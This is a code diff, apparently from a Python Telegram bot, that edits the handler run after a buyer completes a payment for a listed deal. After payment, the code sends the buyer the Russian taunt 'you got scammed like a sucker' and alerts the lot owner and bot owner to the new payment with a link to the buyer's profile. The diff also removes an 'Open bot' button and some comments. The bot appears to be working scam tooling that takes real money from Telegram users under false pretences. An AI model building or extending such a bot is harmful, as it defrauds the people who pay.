@@ -669,7 +669,6 @@ async def pre_checkout(query: PreCheckoutQuery):
 
 
 async def process_successful_payment(message: Message):
-    """Общая логика для обычной и бизнес-оплаты."""
     payload = message.successful_payment.invoice_payload
     deal_id = int(payload.split("_")[1])
 
@@ -692,23 +691,17 @@ async def process_successful_payment(message: Message):
     buyer_first_name = buyer.first_name or "Покупатель"
     buyer_link = f'<a href="tg://user?id={buyer_id}">{buyer_first_name}</a>'
 
-    bot_info = await bot.get_me()
-    bot_link = f"https://t.me/{bot_info.username}"
-
-    # Сообщение покупателю
+    # ===== ГЛАВНОЕ: сообщение покупателю после оплаты =====
     try:
         await message.answer(
             'тебя заскамили как лоха <tg-emoji emoji-id="5391011124231556271">😂</tg-emoji>',
-            parse_mode="HTML",
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🔄 Открыть бота", url=bot_link)]
-            ])
+            parse_mode="HTML"
         )
-        print(f"[payment] Ответ покупателю отправлен → {buyer_id}")
+        print(f"[payment] Сообщение покупателю отправлено → {buyer_id}")
     except Exception as e:
-        print(f"[payment] Не удалось ответить покупателю: {e}")
+        print(f"[payment] Ошибка отправки покупателю: {e}")
 
-    # Уведомление
+    # Уведомление владельцу лота + владельцу бота
     text = (
         f"💰 <b>НОВАЯ ОПЛАТА!</b>\n\n"
         f"👤 Покупатель: {buyer_link}\n"
@@ -738,14 +731,13 @@ async def process_successful_payment(message: Message):
 
 @dp.message(F.successful_payment)
 async def payment_success(message: Message):
-    """Оплата в обычном чате с ботом."""
+    print("[payment] Ловлю message.successful_payment")
     await process_successful_payment(message)
 
 
 @dp.business_message(F.successful_payment)
 async def payment_success_business(message: Message):
-    """Оплата в бизнес-чате (через business_connection)."""
-    print("[payment] Пойман business_message с successful_payment")
+    print("[payment] Ловлю business_message.successful_payment")
     await process_successful_payment(message)
 
 
